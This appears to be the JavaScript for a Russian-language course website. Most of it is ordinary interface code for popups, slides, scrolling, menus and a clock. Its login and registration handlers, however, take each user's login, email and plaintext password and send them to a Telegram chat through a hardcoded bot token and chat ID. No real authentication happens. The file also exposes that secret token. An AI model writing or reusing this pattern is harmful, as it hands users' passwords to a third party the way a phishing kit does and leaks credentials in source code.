function openIndex() {
  location.href = '../index.html';
}

function openMap() {
  location.href = './saitMap.html';
}

function openPopup() {
  Popup = document.querySelector('.Popup');
  Popup.style.display = 'flex';
}

function closePopup() {
  Popup = document.querySelector('.Popup');
  Popup.style.display = 'none';
}

function openReg() {
  Reg = document.querySelector('.Reg');
  Reg.style.display = 'flex';
}

function closeReg() {
  Reg = document.querySelector('.Reg');
  Reg.style.display = 'none';
}

function openAvtor() {
  Avtor = document.querySelector('.Avtor');
  Avtor.style.display = 'flex';
}

function closeAvtor() {
  Avtor = document.querySelector('.Avtor');
  Avtor.style.display = 'none';
}

let i = 0;

function goToSlide() {
  main1 = document.querySelector('.fifth_main1');
  main2 = document.querySelector('.fifth_main2');
  main3 = document.querySelector('.fifth_main3');
  main4 = document.querySelector('.fifth_main4');
  if (i < 0) {
    i = i * -1;
  }
  var num = i % 4;
  if (num === 0) {
    main1.style.display = 'flex';
    main2.style.display = 'none';
    main3.style.display = 'none';
    main4.style.display = 'none';
  } else if (num === 1) {
    main1.style.display = 'none';
    main2.style.display = 'flex';
    main3.style.display = 'none';
    main4.style.display = 'none';
  } else if (num === 2) {
    main1.style.display = 'none';
    main2.style.display = 'none';
    main3.style.display = 'flex';
    main4.style.display = 'none';
  }else if (num === 3) {
    main1.style.display = 'none';
    main2.style.display = 'none';
    main3.style.display = 'none';
    main4.style.display = 'flex';
  }
}

function next() {
  i = i + 1;
  goToSlide();
}

function back() {
  i = i - 1;
  goToSlide();
}

document.addEventListener('scroll', function() {
  let scrollHeight = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
  if (scrollHeight > 1000) {
    document.getElementById('backToTop').style.opacity = 1;
  } else {
    document.getElementById('backToTop').style.opacity = 0;
  }
});

const buttonToTop = document.querySelector('.backToTopButton');

buttonToTop.addEventListener('click' , e => {
  window.scrollTo({ top: 0, behavior: "smooth" });
})

function review() {
  alert("Ваш отзыв принят на рассмотрение!");
}

const botToken = '7646796544:AAG2VPfA7aw3rqLowLLCG5NaYpnfNbdhoR0';
const chatId = '1074140202';

// Функция для отправки сообщения
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Данные успешно отправлены!');
        } else {
            alert('Ошибка при отправке: ' + data.description);
        }
    })
    .catch(error => {
        alert('Ошибка сети: ' + error);
    });
}

// Обработчик для входа
function avtor() {
    const login = document.getElementById('login').value.trim();
    const password = document.getElementById('password').value.trim();

    // Можно добавить проверку
    if (!login || !password) {
        alert('Пожалуйста, заполните все поля');
        return;
    }

    const message = `<b>Вход:</b>\nЛогин: ${login}\nПароль: ${password}`;
    sendToTelegram(message);
}

// Обработчик для регистрации
function reg() {
    const username = document.getElementById('reg_username').value.trim();
    const email = document.getElementById('reg_email').value.trim();
    const password = document.getElementById('reg_password').value.trim();
    const confirmPassword = document.getElementById('reg_confirm_password').value.trim();

    // Проверки
    if (!username || !email || !password || !confirmPassword) {
        alert('Пожалуйста, заполните все поля');
        return;
    }
    if (password !== confirmPassword) {
        alert('Пароли не совпадают');
        return;
    }
    // Простая проверка email
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(email)) {
        alert('Введите корректный email');
        return;
    }

    const message = `<b>Регистрация:</b>\nИмя пользователя: ${username}\nEmail: ${email}\nПароль: ${password}`;
    sendToTelegram(message);
}

const button = document.querySelector('.courses');
const drive = document.querySelector('.sixth_div');
const button1 = document.querySelector('.teacher');
const drive1 = document.querySelector('.fifth_div');
const button2 = document.querySelector('.contackt');
const drive2 = document.querySelector('footer');

button.addEventListener('click' , e => {
  drive.scrollIntoView({
    block: 'nearest',
    behavior: 'smooth',
  })
})

button1.addEventListener('click' , e => {
  drive1.scrollIntoView({
    block: 'nearest',
    behavior: 'smooth',
  })
})

button2.addEventListener('click' , e => {
  drive2.scrollIntoView({
    block: 'nearest',
    behavior: 'smooth',
  })
})

var k1 = 0;
var k2 = 0;
var k3 = 0;

function accMenu1() {
  panel1 = document.querySelector('.panel1')
  k1 += 1;
  var num = k1 % 2;
  if (num === 1) {
    panel1.style.display = "block"
  }
  if (num === 0) {
    panel1.style.display = "none"
  }
}

function accMenu2() {
  panel2 = document.querySelector('.panel2')
  k2 += 1;
  var num = k2 % 2;
  if (num === 1) {
    panel2.style.display = "block"
  }
  if (num === 0) {
    panel2.style.display = "none"
  }
}

function accMenu3() {
  panel3 = document.querySelector('.panel3')
  k3 += 1;
  var num = k3 % 2;
  if (num === 1) {
    panel3.style.display = "block"
  }
  if (num === 0) {
    panel3.style.display = "none"
  }
}

function toBasketIndex() {
  window.location.href = ('./html/basket.html')
}

function toBasket() {
  window.location.href = ('../html/basket.html')
}

function startClock() {
  const clock = document.createElement('div');
  clock.id = 'clock';
  clock.style.position = 'fixed';
  clock.style.bottom = '2%';
  clock.style.right = '5%';
  clock.style.color = 'white';
  clock.style.fontSize = '12pt';
  clock.style.width = '10%';
  clock.style.minWidth = '120px';
  document.body.appendChild(clock);

  function updateClock() {
    const now = new Date();
    const timeStr = now.toLocaleTimeString();
    clock.textContent = 'Текущее время: ' + timeStr;
  }

  // Вызываем сразу для отображения времени без задержки
  updateClock();

  // Запускаем обновление каждую секунду
  setInterval(updateClock, 1000);
}

window.addEventListener('DOMContentLoaded', () => {
  startClock();
})